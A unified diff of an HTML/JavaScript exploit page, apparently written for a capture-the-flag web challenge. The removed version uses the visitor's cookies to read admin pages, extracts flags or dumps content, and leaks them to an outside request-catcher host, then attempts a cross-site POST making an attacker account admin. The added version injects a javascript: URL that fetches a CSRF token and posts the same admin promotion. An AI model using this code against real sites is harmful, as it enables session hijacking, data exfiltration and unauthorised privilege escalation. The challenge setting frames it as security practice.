@@ -1,49 +1,17 @@
-<!doctype html><meta charset="utf-8"><title>probe</title>
 <script>
-(async ()=>{
-  const V = 'http://web1-79e4a3bc.p1.securinets.tn';   
-  const LEAK = 'https://ocyhewo.request.dreamhack.games'; 
-  const ME = (m)=>{ new Image().src = LEAK + '/?d=' + encodeURIComponent(m); };
-
-  ME('start');
-
-  let canRead = false, html = '';
+const w = window.open('http://localhost:3000/', 'x');
+setTimeout(() => {
   try {
-    const r = await fetch(V + '/admin/users', { credentials: 'include' });
-    html = await r.text();
-    if (html.includes('<table') || html.includes('Users') || html.length > 200) {
-      canRead = true;
-    }
-  } catch(e){}
-
-  if (canRead) {
-    const pages = ['/secrets','/admin/msgs','/admin/users'];
-    let dump = '';
-    for (const p of pages) {
-      try {
-        const r = await fetch(V+p, { credentials:'include' });
-        dump += '\n\n===== '+p+' =====\n' + await r.text();
-      } catch(e){}
-    }
-    const m = dump.match(/(CTF|FLAG)\{[^}]+\}/i);
-    if (m) { ME('flag='+m[0]); return; }
-    ME('dump='+dump.slice(0,1800));
-    return;
-  }
-
-  ME('cant-read'); 
-
-  const ATTACKER_ID = 72; 
-  const f = document.createElement('form');
-  f.method = 'POST';
-  f.action = V + '/admin/addAdmin';
-  f.target = '_self';
-  const a = document.createElement('input'); a.name='userId'; a.value=String(ATTACKER_ID);
-  f.appendChild(a);
-  document.body.appendChild(f);
-  ME('try-post-no-csrf');
-  f.submit();
-
-  setTimeout(()=>ME('maybe-promoted'), 3000);
-})();
+    w.location = `javascript:
+      fetch('/csrf-token',{credentials:'include'})
+        .then(r=>r.json())
+        .then(t=>fetch('/admin/addAdmin',{
+          method:'POST',
+          headers:{'content-type':'application/json','CSRF-Token':t.csrfToken},
+          credentials:'include',
+          body:JSON.stringify({userId:164})
+        }))
+    `;
+  } catch(e) {}
+}, 1200);
 </script>
